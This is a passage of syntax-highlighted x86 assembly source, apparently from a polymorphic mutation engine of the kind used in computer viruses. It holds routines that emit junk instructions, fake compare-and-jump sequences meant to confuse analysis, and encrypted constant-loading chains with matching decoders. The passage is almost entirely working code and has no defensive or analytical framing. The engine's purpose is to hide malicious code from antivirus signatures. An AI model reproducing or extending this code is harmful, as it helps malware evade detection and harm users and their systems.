        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__ppv_finish</span><span class="sc0">
    </span><span class="sc5">__ppv_finish16</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">     </span><span class="sc1">;POP reg16</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5866h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc5">__ppv_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to crypt a random value to reg32 ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_crypt_value</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_crypt_value</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to simulate end of encode-loop ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function can generate "destination"  compare  like a</span><span class="sc0">
        </span><span class="sc1">;bafflement. So, this garbage generate this code:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   CALL        __pos_1     ;any garbages</span><span class="sc0">
        </span><span class="sc1">;   &lt;rnd_data&gt;          ;typical CALL rnd_data</span><span class="sc0">
        </span><span class="sc1">;  __i: JMP     __compare_back  ;  NEW JUMP</span><span class="sc0">
        </span><span class="sc1">;   &lt;rnd_data&gt;          ;typical CALL rnd_data</span><span class="sc0">
        </span><span class="sc1">;  __pos_1:</span><span class="sc0">
        </span><span class="sc1">;   &lt;next_code&gt;         ;loop,next_index...</span><span class="sc0">
        </span><span class="sc1">;   DEC     reg32       ;typical CMP instruction</span><span class="sc0">
        </span><span class="sc1">;   &lt;garbages&gt;</span><span class="sc0">
        </span><span class="sc1">;   CMP     reg32,reg32     ;compare registers</span><span class="sc0">
        </span><span class="sc1">;   &lt;garbages - no_flags&gt;       ;no_flags garbages</span><span class="sc0">
        </span><span class="sc1">;   JNZ     __i         ;typical CMP c-jump</span><span class="sc0">
        </span><span class="sc1">;   &lt;garbages&gt;</span><span class="sc0">
        </span><span class="sc1">;  __compare_back:          ;come back and continue</span><span class="sc0">
        </span><span class="sc1">;   &lt;next_code&gt;</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_compare</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; do not recursived - because it's few registers</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">a_compare</span><span class="sc0">

        </span><span class="sc1">; have we some free place in rnd_fill ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_compare</span><span class="sc0">

        </span><span class="sc1">; this garbage only in the main loop</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">],-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_compare</span><span class="sc0">

        </span><span class="sc1">; save used-regs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; select a free base-reg to DEC</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">          </span><span class="sc1">;DEC</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; build CMP instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc5">__gc_new_reg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_reg</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">;i don't want same regz</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__gc_new_reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;reg to AH</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; * 8</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3Bh</span><span class="sc0">          </span><span class="sc1">;CMP ...</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage_no_flags</span><span class="sc0">

        </span><span class="sc1">; build JNZ jmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">850Fh</span><span class="sc0">        </span><span class="sc1">;JNZ far signature</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">   </span><span class="sc1">;select &lt;compare_index&gt;</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_buffer</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">poly_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; build JMP to rnd_fill</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">;EDI of rnd_fill_jmp in ECX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">         </span><span class="sc1">;JMP far signature</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000005h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">00000001h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">

        </span><span class="sc1">; destroy all rnd_fill buffers</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">compare_index</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc1">; restore used_regs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">a_compare</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to fix delta for copro operations ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;If we generated offset of free memory (by __copro_get_mem)</span><span class="sc0">
        </span><span class="sc1">;then it's more then time to use delta.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:    EBX = offset to reg</span><span class="sc0">
</span><span class="sc5">__copro_fix_delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">;ADD instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">__copro_unfix_delta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Bh</span><span class="sc0">          </span><span class="sc1">;SUB instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">gl_index_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to crypt a destination value ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   ÀÄÄÄÄÄÄÄÄÄ sado-maso function ÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This function is for crypt a real value  which we want to</span><span class="sc0">
        </span><span class="sc1">;hide. I use only base-reg (eax,edi...) because If I would</span><span class="sc0">
        </span><span class="sc1">;like to  introduce the  coprocessor I'd have to  use FILD</span><span class="sc0">
        </span><span class="sc1">;and FIST instruction: FILD qword ptr [edi],  where  EDI I</span><span class="sc0">
        </span><span class="sc1">;wanted generate. At first I  generate code  for  encode a</span><span class="sc0">
        </span><span class="sc1">;destination value  and I find out a crypt  value.  During</span><span class="sc0">
        </span><span class="sc1">;encoding I save a opposite instruction to stack  (add &lt;=&gt;</span><span class="sc0">
        </span><span class="sc1">;sub). I could not to save decode instructions into a spe-</span><span class="sc0">
        </span><span class="sc1">;cial buffer because I didn't know a real size - the stack</span><span class="sc0">
        </span><span class="sc1">;is better for this.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:       EAX=destination value</span><span class="sc0">
        </span><span class="sc1">;          BL=destionation register (not in BCD)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;used instructions: ADD opposite SUB and on the contrary</span><span class="sc0">
        </span><span class="sc1">;           ROL opposite ROR</span><span class="sc0">
        </span><span class="sc1">;           XOR reg &lt;==&gt; XOR reg</span><span class="sc0">
        </span><span class="sc1">;           NOT reg &lt;==&gt; NOT reg</span><span class="sc0">
        </span><span class="sc1">;           MOV reg1,reg2 &lt;==&gt; MOV reg2,reg1</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;do you have anything else ?</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;and now... example:</span><span class="sc0">
        </span><span class="sc1">;   * I want to generate number 0x402CC1 to EDX register</span><span class="sc0">
        </span><span class="sc1">;           MOV   ESI, 1985FDD6</span><span class="sc0">
        </span><span class="sc1">;           ROL   ESI, BB</span><span class="sc0">
        </span><span class="sc1">;           MOV   EAX, ESI</span><span class="sc0">
        </span><span class="sc1">;           NOT   EAX</span><span class="sc0">
        </span><span class="sc1">;           MOV   EDX, EAX</span><span class="sc0">
        </span><span class="sc1">;           SUB   EDX, 4FF3A350  -&gt;EDX = 0x402CC1</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;This is only example but reality it other... better !!!</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">actual_reg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where we've our number which we're generating</span><span class="sc0">
        </span><span class="sc5">future_reg</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;our destination register</span><span class="sc0">
        </span><span class="sc5">actual_instr</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;actual instruction in generate</span><span class="sc0">
        </span><span class="sc5">old_place</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;where's start crypt value</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ppe_crypt_value</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;save destination value</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">old_place</span><span class="sc0"> </span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">future_reg</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">

        </span><span class="sc1">; save destination value to destination reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0B8h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;select destination reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">               </span><span class="sc1">;save destination value</span><span class="sc0">

        </span><span class="sc1">; how many instruction we'll use</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000007h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_instr</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">12345678h</span><span class="sc0">       </span><span class="sc1">;flag to stack</span><span class="sc0">
    </span><span class="sc5">__cv_next_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000003h</span><span class="sc0">       </span><span class="sc1">;may I change register ?</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cv_continue</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">   </span><span class="sc1">;i want a free register</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;my future reg32</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_next_loop</span><span class="sc0">      </span><span class="sc1">;blah - mov ecx,ecx ??</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;finish but now i must create opposite for decode</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08Bh</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;ax = decode mov</span><span class="sc0">

    </span><span class="sc5">__cv_continue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_num_code</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_num_code</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_num_code</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;load where we have encode instruction</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;AH = base_reg, AL = id_operation</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">actual_reg</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;save because of separate actual_reg</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;imm(X) = 3rd_number * 8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;now, we must generate imm</span><span class="sc0">
    </span><span class="sc5">__cv_generate_imm</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc1">;imm32 = (add,sub) reg32,imm32</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">           </span><span class="sc1">;imm8  = (rol,ror) reg32,imm8</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cv_opposite_code</span><span class="sc0">  </span><span class="sc1">;imm0  = not reg32</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;save rnd number to EBX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__cv_generate_imm</span><span class="sc0">

    </span><span class="sc5">__cv_opposite_code</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;ax = imm(X)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">          </span><span class="sc1">;ch = reg32, cl = encode instruction</span><span class="sc0">
    </span><span class="sc5">__cv_oc_generate_imm</span><span class="sc4">:</span><span class="sc0">
